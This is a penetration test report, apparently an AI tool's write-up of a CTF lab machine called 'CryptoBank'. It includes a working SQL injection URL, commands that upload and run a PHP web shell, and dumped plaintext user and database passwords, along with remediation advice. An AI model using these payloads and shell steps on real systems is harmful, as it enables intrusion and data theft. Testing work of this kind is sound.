# Penetration Test Report: CryptoBank Trading Platform

**Target:** 192.168.64.23 (cryptobank)
**Test Date:** 2025-12-19
**Tester:** VibeHackAI
**Classification:** Confidential

---

## Executive Summary

A penetration test was conducted on the CryptoBank Trading Platform, resulting in the discovery of multiple **Critical** level vulnerabilities. An attacker can chain these vulnerabilities to steal authentication credentials, execute arbitrary code, and gain complete access to the system.

### Risk Rating: **CRITICAL**

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 4 |
| Medium | 5 |
| Low | 2 |

---

## Target Information

| Item | Value |
|------|-------|
| IP Address | 192.168.64.23 |
| Hostname | cryptobank |
| OS | Ubuntu Linux 4.15.0-213-generic |
| Web Server | Apache/2.4.29 |
| PHP Version | 7.2.24 |
| Database | MySQL 5.7.42 |
| WAF | NinjaFirewall |

### Open Ports

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Apache/2.4.29 |

---

## Discovered Vulnerabilities

### 1. SQL Injection (Critical)

**Location:** `/trade/applying_loan.php?loan_id=`
**Type:** Union-based SQL Injection
**CVSS:** 9.8

**Description:**
Insufficient sanitization of the `loan_id` parameter allows for UNION-based SQL injection. All information in the database (including user credentials) can be extracted.

**Proof of Concept:**
```
GET /trade/applying_loan.php?loan_id=0+UNION+SELECT+1,group_concat(username,':',password),3+FROM+accounts--+-
```

**Impact:**
- Plaintext password leakage for 12 users
- Complete exposure of database structure
- Balance information theft

**Extracted Credentials:**
| Username | Password |
|----------|----------|
| williamdelisle | gFG7pqE5cn |
| juliusthedeveloper | wJWm4CgV26 |
| bill.w | 3Nrc2FYJMe |
| johndl33t | NqRF4W85yf |
| mrbitcoin | LxZjkK87nu |
| spongebob | 3mwZd896Me |
| dreadpirateroberts | 7HwAEChFP9 |
| deadbeef | 6X7DnLF5pG |
| buzzlightyear | LnBHvEhmw3 |
| tim | zm2gBcaxd3 |
| patric | iampatric |
| notanirsagent | 8hPx2Zqn4b |

---

### 2. Unrestricted File Upload (Critical)

**Location:** `/development/tools/FileUpload/fileupload.php`
**CVSS:** 9.8

**Description:**
The file upload function validates file types only by magic bytes (file header), allowing upload of `.phtml` extension files. Since Apache executes these as PHP, RCE is possible.

**Proof of Concept:**
```bash
# Create malicious file with GIF header
echo -e 'GIF89a<?php system($_GET["c"]); ?>' > shell.phtml

# Upload
curl -u "julius.b:wJWm4CgV26" -F "file=@shell.phtml" \
  "http://192.168.64.23/development/tools/FileUpload/fileupload.php"

# Execute command
curl "http://192.168.64.23/development/tools/FileUpload/uploads/shell.phtml?c=id"
# Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Impact:**
- Remote Code Execution as www-data
- Full filesystem access
- Potential privilege escalation

---

### 3. Weak Basic Authentication Credentials (Critical)

**Location:** `/development/`
**CVSS:** 9.1

**Description:**
The development directory's Basic authentication uses the same password as the database, allowing access with credentials obtained via SQLi.

**Credentials:** `julius.b:wJWm4CgV26`

**Impact:**
- Access to development tools
- Direct path to RCE

---

### 4. Sensitive Information Disclosure - PHPInfo (High)

**Location:** `/info.php`
**CVSS:** 7.5

**Description:**
PHPInfo page is publicly accessible, leaking the following critical information:
- `allow_url_include = On` (dangerous setting)
- `allow_url_fopen = On`
- File path information
- Server configuration details

---

### 5. Plaintext Password Storage (High)

**Location:** Database `cryptobank.accounts`
**CVSS:** 7.5

**Description:**
User passwords are stored in plaintext without hashing.

**Impact:**
- Immediate password leakage when SQLi occurs
- Risk of credential reuse on other services

---

### 6. Missing CSRF Protection (High)

**Location:** `/trade/login_auth.php`, `/trade/money_transfer.php`
**CVSS:** 8.0

**Description:**
CSRF tokens are not implemented on login forms and money transfer functionality.

**Impact:**
- Cross-Site Request Forgery attacks
- Potential unauthorized transfers

---

### 7. Session Management Issues (High)

**Location:** `/trade/home.php`, `/trade/money_transfer.php`
**CVSS:** 7.4

**Description:**
Authentication checks are incomplete, allowing access to some authenticated pages while not logged in. Page content is displayed but username is empty.

---

### 8. Directory Listing Enabled (Medium)

**Location:** `/assets/`, `/development/tools/`, `/development/backups/`
**CVSS:** 5.3

**Description:**
Directory listing is enabled on multiple directories.

---

### 9. Hardcoded Database Credentials (Medium)

**Location:** `/var/www/cryptobank/trade/mysql_connect_init.php`
**CVSS:** 6.5

**Credentials:**
```php
$user = "cryptobank";
$password = "1000lambos";
$host = "localhost";
$db = "cryptobank";
```

---

### 10. Development Tools in Production (Medium)

**Location:** `/development/tools/`
**CVSS:** 6.8

**Description:**
Development tools (command execution, file inclusion, file upload) remain in the production environment.

---

### 11. Information Disclosure via Error Messages (Medium)

**Location:** Various
**CVSS:** 5.0

**Description:**
Error messages may contain file paths and stack traces.

---

### 12. Missing Rate Limiting (Medium)

**Location:** `/trade/login_auth.php`
**CVSS:** 5.3

**Description:**
No limit on login attempts, allowing brute force attacks.

---

### 13. Outdated Software (Low)

**CVSS:** 4.0

| Software | Current | Latest |
|----------|---------|--------|
| Apache | 2.4.29 | 2.4.58+ |
| PHP | 7.2.24 | 8.3+ |
| OpenSSH | 7.6p1 | 9.6+ |
| MySQL | 5.7.42 | 8.0+ |

---

### 14. Email Address Disclosure (Low)

**Location:** Main page source, `/info.php`
**CVSS:** 3.1

**Exposed:**
- `admin@cryptobank.local`
- Team member email patterns (julius.b, william.d, etc.)

---

## Attack Chain

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACK FLOW                               │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Reconnaissance                                           │
│     └─> Nmap scan: SSH (22), HTTP (80)                      │
│                                                              │
│  2. Web Enumeration                                          │
│     └─> Discovered: /info.php, /development/, /trade/       │
│                                                              │
│  3. SQL Injection                                            │
│     └─> /trade/applying_loan.php?loan_id=                   │
│     └─> Extracted: 12 user credentials (plaintext)          │
│     └─> Database: cryptobank, MySQL 5.7.42                  │
│                                                              │
│  4. Authentication Bypass                                    │
│     └─> /development/ Basic Auth                            │
│     └─> Credentials: julius.b:wJWm4CgV26                    │
│                                                              │
│  5. File Upload Exploitation                                 │
│     └─> /development/tools/FileUpload/                      │
│     └─> Bypass: GIF89a header + .phtml extension            │
│     └─> Uploaded: shell.phtml                               │
│                                                              │
│  6. Remote Code Execution                                    │
│     └─> shell.phtml?c=id                                    │
│     └─> www-data access achieved                            │
│                                                              │
│  7. Post-Exploitation                                        │
│     └─> Flag: flag{l4szl0h4ny3cz1smyh3r0}                   │
│     └─> MySQL creds: cryptobank:1000lambos                  │
│     └─> Full filesystem read access                         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Recommendations

### Immediate Actions (Critical)

1. **SQL Injection Fix**
   - Use Prepared statements / Parameterized queries
   - Strict validation of input values
   ```php
   // Before (Vulnerable)
   $query = "SELECT * FROM loans WHERE id_loans = '".$_GET['loan_id']."'";

   // After (Secure)
   $stmt = $conn->prepare("SELECT * FROM loans WHERE id_loans = ?");
   $stmt->bind_param("i", $_GET['loan_id']);
   ```

2. **File Upload Fix**
   - Whitelist-based extension check
   - File content validation
   - Disable PHP execution in upload directory
   ```apache
   <Directory /var/www/cryptobank/development/tools/FileUpload/uploads>
       php_flag engine off
   </Directory>
   ```

3. **Remove Development Tools**
   - Remove `/development/tools/` from production environment
   - Or implement proper access control

4. **Password Security**
   - Hash all passwords with bcrypt/Argon2
   - Force password reset for existing users

### Short-term Actions (High)

5. **CSRF Protection**
   - Implement CSRF tokens on all forms

6. **Session Management**
   - Implement proper session validation on all pages

7. **Credential Rotation**
   - Change database password
   - Change Basic authentication password
   - Notify all affected users

### Medium-term Actions

8. **Software Updates**
   - Update Apache, PHP, MySQL, OpenSSH to latest versions

9. **Security Headers**
   ```apache
   Header set X-Content-Type-Options "nosniff"
   Header set X-Frame-Options "DENY"
   Header set X-XSS-Protection "1; mode=block"
   Header set Content-Security-Policy "default-src 'self'"
   ```

10. **Disable Directory Listing**
    ```apache
    Options -Indexes
    ```

11. **Remove phpinfo()**
    - Delete `/info.php`

12. **Implement Rate Limiting**
    - Introduce fail2ban or mod_evasive

---

## Appendix

### A. Tools Used

- Nmap 7.93
- cURL 8.7.1
- Custom Bash scripts
- Python 3.x

### B. Files Retrieved

| File | Description |
|------|-------------|
| /home/cryptobank/flag.txt | CTF Flag |
| /var/www/cryptobank/trade/mysql_connect_init.php | DB Credentials |
| /var/www/cryptobank/development/backups/home/dev-notes.txt | Developer Notes |

### C. Timeline

| Time | Action |
|------|--------|
| 08:00 | Reconnaissance started |
| 08:10 | Port scan completed |
| 08:20 | Web enumeration |
| 08:45 | SQL Injection discovered |
| 09:00 | Credentials extracted |
| 09:30 | /development/ access |
| 16:50 | RCE achieved |
| 16:57 | Flag captured |

---

## Conclusion

Multiple critical vulnerabilities exist in the CryptoBank Trading Platform, allowing an attacker to start from SQL injection and ultimately achieve code execution on the server.

The following points require immediate attention:
1. Fix SQL injection
2. Remove development tools
3. Hash plaintext passwords
4. Notify affected users and reset passwords

Re-testing is recommended after implementing the fixes described in this report.

---

**Report Generated:** 2025-12-19
**Classification:** Confidential
**Distribution:** Security Team, Development Team, CISO
